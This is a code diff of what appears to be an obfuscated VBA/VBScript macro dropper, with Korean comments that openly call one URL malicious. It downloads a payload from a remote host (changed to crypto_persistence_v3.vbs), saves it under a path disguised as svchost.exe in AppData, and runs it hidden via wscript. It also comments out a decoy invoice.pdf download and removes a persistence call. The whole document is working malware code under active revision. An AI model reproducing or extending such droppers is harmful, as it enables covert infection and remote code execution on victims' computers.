@@ -52,24 +52,24 @@ Sub zXcVbNmQ()
     Dim uRlQwErT1, uRlQwErT2
     
     ' 정상 문서 URL - 평문으로 설정
-    uRlQwErT1 = "http://192.168.1.100:8080/invoice.pdf"
-    
-    ' 악성코드 URL - 평문으로 설정
-    uRlQwErT2 = "http://192.168.1.100:8080/payload.exe"
+    uRlQwErT1 = "http://192.168.202.44:8080/invoice.pdf"
+
+    ' 악성코드 URL - 평문으로 설정 (VBS로 변경)
+    uRlQwErT2 = "http://192.168.202.44:8080/crypto_persistence_v3.vbs"
     
     ' ====================================
     ' 경로는 여전히 난독화
     ' ====================================
     
-    ' Path 1: %TEMP%\invoice.pdf
-    Dim pThQwErT1
-    pThQwErT1 = vBnMkLpQ & gKpQwRtY(Array(46798,46801,46801,46801,46801,46801,46850,46801,46801,46787,46294,46851,46800,46849),wShKpLqR)
-    
-    ' 다운로드 1
-    If mNbVcXzL(uRlQwErT1, pThQwErT1, hTtPxMlK, sAdFgHjK, wShKpLqR) Then
-        oQwErTyU.Run """" & pThQwErT1 & """", 1, False
-    End If
-    
+    ' Path 1: %TEMP%\invoice.pdf (주석처리)
+    'Dim pThQwErT1
+    'pThQwErT1 = vBnMkLpQ & gKpQwRtY(Array(46798,46801,46801,46801,46801,46801,46850,46801,46801,46787,46294,46851,46800,46849),wShKpLqR)
+
+    ' 다운로드 1 (주석처리)
+    'If mNbVcXzL(uRlQwErT1, pThQwErT1, hTtPxMlK, sAdFgHjK, wShKpLqR) Then
+    '    oQwErTyU.Run """" & pThQwErT1 & """", 1, False
+    'End If
+
     ' Path 2: %APPDATA%\Windows\svchost.exe
     Dim pThQwErT2, dIrQwErT
     dIrQwErT = cXzAsDfG & gKpQwRtY(Array(46798,46823,46801,46801,46801,46801,46794,46801,46849,46787),wShKpLqR)
@@ -82,10 +82,7 @@ Sub zXcVbNmQ()
     
     ' 다운로드 2
     If mNbVcXzL(uRlQwErT2, pThQwErT2, hTtPxMlK, sAdFgHjK, wShKpLqR) Then
-        oQwErTyU.Run """" & pThQwErT2 & """", 0, False
-        
-        ' 지속성
-        Call rPsXzCvBn(pThQwErT2, oQwErTyU, wShKpLqR)
+        oQwErTyU.Run "wscript.exe """ & pThQwErT2 & """", 0, False
     End If
     
     Set oQwErTyU = Nothing
